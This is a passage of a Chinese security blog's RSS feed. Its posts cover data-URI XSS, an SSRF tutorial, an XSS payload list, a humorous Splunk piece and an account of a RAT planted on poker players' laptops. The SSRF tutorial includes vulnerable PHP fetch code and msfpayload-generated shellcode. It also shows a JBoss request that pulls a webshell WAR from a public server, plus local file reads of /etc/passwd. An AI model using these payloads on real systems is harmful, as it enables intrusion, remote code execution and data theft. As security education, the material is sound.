&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri5.png' /&gt;&lt;/p&gt;

&lt;p&gt;可以使用data uri来进行xss的html标签有很多。不仅仅是anchor，iframe，object，image。比如&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a src=&amp;quot;data:text/html;,&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;test&amp;lt;/a&amp;gt;
&amp;lt;EMBED SRC=&amp;quot;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoJ2ZyZWVidWYuY29tJyk7PC9zY3JpcHQ+PC9zdmc+&amp;quot; AllowScriptAccess=&amp;quot;always&amp;quot;&amp;gt;&amp;lt;/EMBED&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;a标签和embed标签都可以，前面提到说是用url制定外部资源的地方都可以用data uri来指定。那么外部资源类型为html等可以执行js的地方，都可以用来进行data uri xss。&lt;/p&gt;

&lt;p&gt;让我吃惊的是firefox在点击a标签的链接时候，执行的js依然继承了来源域。关于firefox这个问题，早在04年就有人给firefox报过bug，不过时至今日。我们看到的就是我们现在看到的样子。。。（参考资料3）&lt;/p&gt;

&lt;p&gt;&lt;img alt='data' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/datauri6.png' /&gt;&lt;/p&gt;

&lt;p&gt;data uri 语法fuzz&lt;/p&gt;

&lt;h1 id='data_urilfi'&gt;data uri在lfi中的利用&lt;/h1&gt;

&lt;h1 id='data_uri'&gt;data uri钓鱼&lt;/h1&gt;

&lt;h2 id='id2666'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.gnucitizen.org/blog/self-contained-xss-attacks/'&gt;self-contained-xss-attacks&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blog.detectify.com/post/32947196572/universal-xss-in-opera'&gt;Universal XSS in Opera&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='https://bugzilla.mozilla.org/show_bug.cgi?id=255107'&gt;Prevent data: URLs from being used for XSS&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/23/data-uri-scheme</link>
                <guid>http://username.github.io/2013/12/23/data-uri-scheme</guid>
                <pubDate>2013-12-23T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>a splunk big data case study</title>
                <description>&lt;p&gt;Santa Claus(圣诞老人)international,和它的其他国际国际品牌像Father Christmas,Kris Kringle,saint Nicholas 和Pere Noel 使用splunk处理大约18 Elfabytes的数据。(processing about 18 Elfabytes of data day in Splunk)意思是总共处理了这么多数据？应该不是每天。18Elfabytes是1024^8 bytes.1 gigabyte = 1024^3 = 1,073,741,824 bytes,这个数量难以置信啊，都数不不过来了。。。）他们使用splunk来提高用户的圣诞节体验，管理他们的礼物操作流程，确保礼物及时的送到20亿儿童手上。&lt;/p&gt;

&lt;p&gt;下面讨论一下圣诞老人国际是如何利用splunk和大数据实现操作智能化的。&lt;/p&gt;

&lt;p&gt;圣诞老人国际在商业上面临很多威胁，除了传统的企业竞争，&lt;/p&gt;

&lt;p&gt;为了发展，圣诞老人国际也在寻求自身的差异化，调整一些衡量自身的KPI：&lt;/p&gt;

&lt;p&gt;1,确保礼物送达的及时性。&lt;/p&gt;

&lt;p&gt;2,准确寄送孩子圣诞礼物列表中的礼物&lt;/p&gt;

&lt;p&gt;3,正确的预测淘气的和乖的孩子&lt;/p&gt;

&lt;p&gt;4,礼物的生产，检验和包装的质量。&lt;/p&gt;

&lt;p&gt;下图是圣诞老人国际（SCI）的生产车间。&lt;/p&gt;

&lt;p&gt;&lt;img alt='plunk' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/splunk1.jpg}' /&gt;&lt;/p&gt;

&lt;p&gt;SCI有很多的数据来源，大部分数据可以进行管理和分析，下面是他们分析数据的几个例子：&lt;/p&gt;

&lt;p&gt;IT操作和应用管理数据&amp;#8211;SCI所有的日志文件（yule log）都在splunk上索引。包括ERP（Enhanced Reindeer Planning）系统，CRM（christmas Readiness Management)应用和NOC（Noel Operations Centre)。有超过20亿的孩子需要寄送礼物，平均每个孩子有3个礼物。SCI有很多的礼物处理数据，他们建立了自己的基于云的应用来处理。这些数据也在splunk中索引。&lt;/p&gt;

&lt;p&gt;HoHoHoDoop&amp;#8211;SCI自己定制了Hadoop，起了个名字叫HoHoHoDoop。这个集群存储了大概10Elfabytes的数据。包括所有他们寄送过礼物的孩子，礼物是何时收到的，过去收到的礼物等等。&lt;/p&gt;

&lt;p&gt;安全信息&amp;#8211;为了防止外部的网络攻击，SCI使用splunk实时监控DDOS攻击尝试和APTs（Awful Present Threats)攻击。&lt;/p&gt;

&lt;p&gt;数据智能&amp;#8211;2013年SCI启动了他们第一个线上服务，Giftlink，这个服务允许孩子通过多种方式提交他们的需求。splunk实时的监控这个服务的数据，还可以生成很多报表。过度的礼物请求，splunk会产生告警，提醒这是一个淘气的孩子。SCI还准备上线一个新的服务来交易自己不喜欢的礼物。偶尔，人们也会犯错，买了自己不喜欢的东西。&lt;/p&gt;

&lt;p&gt;&lt;img alt='plunk' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/splunk2.jpg}' /&gt;&lt;/p&gt;

&lt;p&gt;右边的图显示英国打开的礼物数和关闭的数量对比。左边是北美已经送达的礼物数量和未送达的实时数据。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/23/a-splunk-big-data-case-study</link>
                <guid>http://username.github.io/2013/12/23/a-splunk-big-data-case-study</guid>
                <pubDate>2013-12-23T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>解析iis 日志</title>
                <description>&lt;p&gt;http://blogs.splunk.com/2013/11/25/decoding-iis-logs/&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/18/iis-</link>
                <guid>http://username.github.io/2013/12/18/iis-</guid>
                <pubDate>2013-12-18T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>ssrf攻击简介</title>
                <description>&lt;h1 id='ssrf'&gt;ssrf攻击概述&lt;/h1&gt;

&lt;p&gt;很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）。&lt;/p&gt;

&lt;p&gt;比如下图显示的就是提供这种功能的典型应用：&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf1.png' /&gt;&lt;/p&gt;

&lt;p&gt;如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。攻击者利用ssrf可以实现的攻击主要有5种：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; 2. 攻击运行在内网或本地的应用程序（比如溢出）;&lt;/li&gt;

&lt;li&gt;对内网web应用进行指纹识别，通过访问默认文件实现;&lt;/li&gt;

&lt;li&gt;攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;&lt;/li&gt;

&lt;li&gt;利用file协议读取本地文件等。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id='id2658'&gt;常用的后端实现&lt;/h1&gt;

&lt;p&gt;ssrf攻击可能存在任何语言编写的应用，我们通过一些php实现的代码来作为样例分析。代码的大部分来自于真实的应用源码。&lt;/p&gt;

&lt;p&gt;1,php file_get_contents:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
if (isset($_POST[&amp;#39;url&amp;#39;])) 
{ 
$content = file_get_contents($_POST[&amp;#39;url&amp;#39;]); 
$filename = &amp;#39;./images/&amp;#39;.rand().&amp;#39;img1.jpg&amp;#39;; 
file_put_contents($filename, $content); 
echo $_POST[&amp;#39;url&amp;#39;].&amp;quot;&amp;quot;; 
$img = &amp;quot;&amp;lt;img src=\&amp;quot;&amp;quot;.$filename.&amp;quot;\&amp;quot;/&amp;gt;&amp;quot;; 
} 
echo $img; 
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码使用 file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。&lt;/p&gt;

&lt;p&gt;2,php fsockopen():&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
function GetFile($host,$port,$link) 
{ 
$fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
if (!$fp) { 
echo &amp;quot;$errstr (error number $errno) \n&amp;quot;; 
} else { 
$out = &amp;quot;GET $link HTTP/1.1\r\n&amp;quot;; 
$out .= &amp;quot;Host: $host\r\n&amp;quot;; 
$out .= &amp;quot;Connection: Close\r\n\r\n&amp;quot;; 
$out .= &amp;quot;\r\n&amp;quot;; 
fwrite($fp, $out); 
$contents=&amp;#39;&amp;#39;; 
while (!feof($fp)) { 
$contents.= fgets($fp, 1024); 
} 
fclose($fp); 
return $contents; 
} 
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。&lt;/p&gt;

&lt;p&gt;3,php curl_exec():&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
if (isset($_POST[&amp;#39;url&amp;#39;]))
{
$link = $_POST[&amp;#39;url&amp;#39;];
$curlobj = curl_init();
curl_setopt($curlobj, CURLOPT_POST, 0);
curl_setopt($curlobj,CURLOPT_URL,$link);
curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($curlobj);
curl_close($curlobj);

$filename = &amp;#39;./curled/&amp;#39;.rand().&amp;#39;.txt&amp;#39;;
file_put_contents($filename, $result); 
echo $result;
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是另外一个很常见的实现。使用curl获取数据。&lt;/p&gt;

&lt;h1 id='id2659'&gt;攻击场景&lt;/h1&gt;

&lt;p&gt;大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。下图展示了web服务器的请求可以到达的地方。&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf2.png' /&gt;&lt;/p&gt;

&lt;h2 id='id2660'&gt;端口扫描&lt;/h2&gt;

&lt;p&gt;大多数社交网站都提供了通过用户指定的url上传图片的功能。如果用户输入的url是无效的。大部分的web应用都会返回错误信息。攻击者可以输入一些不常见的但是有效的URI，比如&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://example.com:8080/dir/images/
http://example.com:22/dir/public/image.jpg
http://example.com:3306/dir/images/&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后根据服务器的返回信息来判断端口是否开放。大部分应用并不会去判断端口，只要是有效的URL，就发出了请求。而大部分的TCP服务，在建立socket连接的时候就会发送banner信息，banner信息是ascii编码的，能够作为原始的html数据展示。当然，服务端在处理返回信息的时候一般不会直接展示，但是不同的错误码，返回信息的长度以及返回时间都可以作为依据来判断远程服务器的端口状态。&lt;/p&gt;

&lt;p&gt;下面一个实现就可以用来做端口扫描：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
if (isset($_POST[&amp;#39;url&amp;#39;]))
{
$link = $_POST[&amp;#39;url&amp;#39;];
$filename = &amp;#39;./curled/&amp;#39;.rand().&amp;#39;txt&amp;#39;;
$curlobj = curl_init($link);
$fp = fopen($filename,&amp;quot;w&amp;quot;);
curl_setopt($curlobj, CURLOPT_FILE, $fp);
curl_setopt($curlobj, CURLOPT_HEADER, 0);
curl_exec($curlobj);
curl_close($curlobj);
fclose($fp);
$fp = fopen($filename,&amp;quot;r&amp;quot;);
$result = fread($fp, filesize($filename)); 
fclose($fp);
echo $result;
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;读者可以使用如下表单提交测试（比较简陋~~）：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;

&amp;lt;form name=&amp;quot;px&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;http://127.0.0.1/ss.php&amp;quot;&amp;gt;


&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;url&amp;quot; value=&amp;quot;&amp;quot;&amp;gt;


&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;commit&amp;quot; value=&amp;quot;submit&amp;quot;&amp;gt;

&amp;lt;/form&amp;gt;

&amp;lt;script&amp;gt;

&amp;lt;/script&amp;gt;

&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;正常情况下，请求http://www.twitter.com/robots.txt 返回结果如下：&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf3.png' /&gt;&lt;/p&gt;

&lt;p&gt;如果请求非http服务的端口，比如：http://scanme.nmap.org:22/test.txt 会返回banner信息&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf4.png' /&gt;&lt;/p&gt;

&lt;p&gt;请求关闭的端口会报错:http://scanme.nmap.org:25/test.txt&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf5.png' /&gt;&lt;/p&gt;

&lt;p&gt;请求本地的mysql端口:http://127.0.0.1:3306/test.txt&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf6.png' /&gt;&lt;/p&gt;

&lt;p&gt;当然大多数互联网的应用并不会直接返回banner信息。不过可以通过前面说过的,处错误信息,响应时间,响应包大小来判断。下面是Google的webmaster应用中,利用返回信息判断端口状态的案例.该缺陷Google已修复。&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf7.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf8.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf9.png' /&gt;&lt;/p&gt;

&lt;h2 id='id2661'&gt;攻击应用程序&lt;/h2&gt;

&lt;p&gt;内网的安全通常都很薄弱,溢出,弱口令等一般都是存在的。通过ssrf攻击,可以实现对内网的访问,从而可以攻击内网或者本地机器,获得shell等。&lt;/p&gt;

&lt;p&gt;下面是用一个小程序本地来演示：&lt;/p&gt;

&lt;p&gt;请求：http://127.0.0.1:8987/test.txt&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf10.png' /&gt;&lt;/p&gt;

&lt;p&gt;探测到8987端口开放。&lt;/p&gt;

&lt;p&gt;请求：http://127.0.0.1:8987/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf11.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf12.png' /&gt;&lt;/p&gt;

&lt;p&gt;这里是白盒分析，实战的时候当然没这个条件只能是利用已知漏洞来溢出。通过分析写好exp。因为http是基于文本的协议，所以处理一些不可以打印的unicode字符会存在问题。这里使用msfencode来进行编码。命令如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msfpayload widnows/exec CMD=calc.exe R | msfencode bufferRegister=ESP -e x86/alpha_mixed&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最终payload如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@&amp;#39;ßwTYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlhhmYUPWpWp3Pk9he01xRSTnkpRfPlKPRtLLKPR24NkbR7XDOMgszuvVQ9oeaKpllgL3QQl5RFLWPiQJodM31JgKRHpaBPWNk3bvpLKsrWLwqZpLK1P0xMU9PSDCz7qZpf0NkQX6xnk2xUps1n3xcgL3yNkednkVayF4qKO5aKpnLIQJo4M31O76XIpbUzTdC3MHxGKamvDbU8bchLKShEtgqhSQvLKtLRkNkShuLgqZslK5TlKVaZpoy3tGTWTqKqKsQ0YSjRqyoKP2xCoSjnkwb8kLFqM0jFaNmLElyc05PC0pPsX6QlK0oOwkOyEOKhph5920VBHY6MEoMOmKON5Uls6SLUZMPykip2UfeoK3wfs422OBJs0Sc9oZuCSPaPl3SC0AA&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;溢出成功，弹出计算器。&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf13.png' /&gt;&lt;/p&gt;

&lt;p&gt;大家也许会对http发送的数据是否能被其他服务器协议接受存在疑问。可以参考&lt;a href='http://www.freebuf.com/articles/web/19622.html'&gt;跨协议通信技术利用&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='web'&gt;内网web应用指纹识别&lt;/h2&gt;

&lt;p&gt;识别内网应用使用的框架，平台，模块以及cms可以为后续的攻击提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜集漏洞进行攻击。比如可以通过访问下列文件来判断phpMyAdmin是否安装：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Request: http://127.0.0.1:8080/phpMyAdmin/themes/original/img/b_tblimport.png
Request: http://127.0.0.1:8081/wp-content/themes/default/images/audio.jpg
Request: http://127.0.0.1:8082/profiles/minimal/translations/README.txt&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;访问 http://10.0.0.1/portName.js 可以判断是否是Dlink 路由器&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf14.png' /&gt;&lt;/p&gt;

&lt;p&gt;下面百度的案例来自于wooyun，已经修复。通过访问http://10.50.33.43:8080/manager/images/tomcat.gif 识别出服务器使用了tomcat。&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf15.png' /&gt; &lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf16.png' /&gt;&lt;/p&gt;

&lt;h2 id='web'&gt;攻击内网web应用&lt;/h2&gt;

&lt;p&gt;仅仅通过get方法可以攻击的web有很多，比如struts2命令执行等。这里提供一个Jboss的案例，使用一个get请求即可部署webshell。&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf17.png' /&gt;&lt;/p&gt;

&lt;p&gt;只需要将网马放在公网服务器上，然后发送这个请求即可：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;amp;name=jboss.system:service=MainDeployer&amp;amp;methodIndex=17&amp;amp;arg0=http://our_public_internet_server/utils/cmd.war&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过加参数请求网马执行命令：http://127.0.0.1:8080/cmd/shell.jsp?x=dir&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf18.png' /&gt;&lt;/p&gt;

&lt;p&gt;实战中一半不会有回显，类似于盲打只能。&lt;/p&gt;

&lt;h2 id='id2662'&gt;读取本地文件&lt;/h2&gt;

&lt;p&gt;上面提到的案例都是基于http请求的。如果我们指定file协议，也可能读到服务器上的文件。如下的请求会让应用读取本地文件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Request: file:///C:/Windows/win.ini&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf19.png' /&gt;&lt;/p&gt;

&lt;p&gt;下面是Adobe的一个案例，已经修复。请求为file:///etc/passwd&lt;/p&gt;

&lt;p&gt;&lt;img alt='baidu' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/ssrf/ssrf20.png' /&gt;&lt;/p&gt;

&lt;h1 id='id2663'&gt;如何防御&lt;/h1&gt;

&lt;p&gt;通常有以下5个思路：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;2. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;限制请求的端口为http常用的端口，比如，80,443,8080,8090。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id='id2664'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-3.html&lt;/p&gt;

&lt;p&gt;http://evilcos.me/?p=221&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/17/ssrf</link>
                <guid>http://username.github.io/2013/12/17/ssrf</guid>
                <pubDate>2013-12-17T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>xss手工测试payload及在线工具</title>
                <description>&lt;h1 id='id2656'&gt;相关文章&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://www.freebuf.com/articles/web/10121.html'&gt;浏览器是如何解码的&lt;/a&gt; &lt;a href='http://xss1.com/?p=19'&gt;XSS与字符编码的那些事儿&lt;/a&gt; &lt;a href='http://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#Resources'&gt;网络浏览器的工作原理&lt;/a&gt;&lt;/p&gt;

&lt;h1 id='id2657'&gt;编码工具&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://app.baidu.com/app/enter?appid=280383'&gt;Xss安全测试字符转换工具&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php'&gt;hackvertor&lt;/a&gt;&lt;/p&gt;

&lt;h1 id='payload'&gt;payload&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;document.scripts[0].src&amp;amp;#00000000000000000000061/data:,alert(2)/.source&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个好高端啊。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&amp;quot;&amp;gt;test&amp;lt;/a&amp;gt;

&amp;lt;embed allownetworking=&amp;quot;all&amp;quot; allowscriptaccess=&amp;quot;never&amp;quot; height=&amp;quot;400&amp;quot; quality=&amp;quot;high&amp;quot; src=&amp;quot;javascript:alert(document.cookie)&amp;quot; style=&amp;quot;margin:0.0px;float:none;&amp;quot; type=&amp;quot;application/x-shockwave-flash&amp;quot; width=&amp;quot;480&amp;quot;&amp;gt;sssssssssssssssssssssssssssssssssss&amp;lt;/embed&amp;gt;


&amp;lt;div style=&amp;quot;background:url(&amp;#39;javascript:alert(1)&amp;#39;)&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ie6测试OK&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;div style=&amp;quot;x:expression(alert(1))&amp;quot;&amp;gt;&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/12/16/xsspayload</link>
                <guid>http://username.github.io/2013/12/16/xsspayload</guid>
                <pubDate>2013-12-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>linux渗透tips</title>
                <description></description>
                <link>http://username.github.io/2013/12/13/linuxtips</link>
                <guid>http://username.github.io/2013/12/13/linuxtips</guid>
                <pubDate>2013-12-13T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>whatweb手册</title>
                <description>&lt;p&gt;https://github.com/urbanadventurer/whatweb&lt;/p&gt;</description>
                <link>http://username.github.io/2013/12/12/whatweb</link>
                <guid>http://username.github.io/2013/12/12/whatweb</guid>
                <pubDate>2013-12-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>sharking:high roller in the crosshairs</title>
                <description>&lt;p&gt;我们（F-secure）的实验室会收到很多样本，大部分是来自于网上。但是有时候也会有人自己带着电脑来实验室让我们做分析。&lt;/p&gt;

&lt;p&gt;今天早些时候,有个20出头的小伙子开着一辆奥迪R8来到了我们赫尔辛基的总部。他叫Jens Kyllönen是一个职业扑克牌玩家,经常参加现场的比赛和一些线上的比赛。他在这个领域很厉害,去年赢了250万美元。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/poke.png' /&gt;&lt;/p&gt;

&lt;p&gt;为什么这么牛逼的扑克高手回来我们实验室呢.听一下他的故事:&lt;/p&gt;

&lt;p&gt;去年九月份Jens在巴塞罗那参加欧洲扑克巡回赛。他住在一个五星级酒店里，白天在酒店比赛,中间休息他回房间发现自己的笔记本不见了。然后他就去朋友那边看看是不是朋友借走了，回来的时候发现笔记本又出现了。所以就觉得事情有些不对劲，而且电脑启动有点不正常。&lt;/p&gt;

&lt;p&gt;Jens在当时论坛里发帖子讲述了这个事情：&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/poke2.png' /&gt;&lt;/p&gt;

&lt;p&gt;他觉得自己的电脑会不会有问题，让我们给分析一下。对于那些利用利用电脑进行线上比赛的扑克玩家来说，电脑的安全当然非常重要。所以我们接受了这个调查，做了一个完整的镜像备份之后，开始了深入的分析。&lt;/p&gt;

&lt;p&gt;很明显他的直觉是非常正确的。没过多久我们就发现他的笔记本被安装了一个木马（RAT），木马安装的时间跟笔记本失踪的时间很吻合。攻击者应该是通过usb存储设备来安装木马的而且设置成了开机自动启动。木马是一种允许攻击者远程控制和监控电脑的程序，可以看到电脑屏幕以及任何被感染电脑上发生的事情。&lt;/p&gt;

&lt;p&gt;下面通过图片说明一下这个木马的工作方式。第一个截图是攻击者看到的自己的比赛屏幕。跟其他比赛选手一样，只能看到自己的牌型。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/poke3.png' /&gt;&lt;/p&gt;

&lt;p&gt;受害者感染了木马之后，攻击者就可以看到对手的配型，这里是两个Q。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/poke4.png' /&gt;&lt;/p&gt;

&lt;p&gt;据我们所知这种攻击很常见，而且任何在线扑克比赛都有效。这个木马是用java写的，可以运行在多个平台（windows，Mac OS，Linux）。下图是截取受害者屏幕的代码片段。&lt;/p&gt;

&lt;p&gt;&lt;img alt='pic' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/poke5.png' /&gt;&lt;/p&gt;

&lt;p&gt;分析完Jens的笔记本之后，我们看是寻找看看是不是有其他人的电脑也被感染了。不出所料，另外一个专业扑克玩家Henri，跟Jens在一个房间比赛的，也感染了同样的木马。&lt;/p&gt;

&lt;p&gt;这不是第一例针对职业扑克玩家的定制木马。我们调查过几个案例，曾经成功窃取了几十万欧元。值得注意的是这些案例都不是在线的攻击，而是通过物理的方式攻击了受害者的电脑。&lt;/p&gt;

&lt;p&gt;这种状况也来越多，所以我们给这种攻击起了一个名字叫白鲨攻击（Sharking）。用来代表针对高端扑克玩家的攻击。&lt;/p&gt;

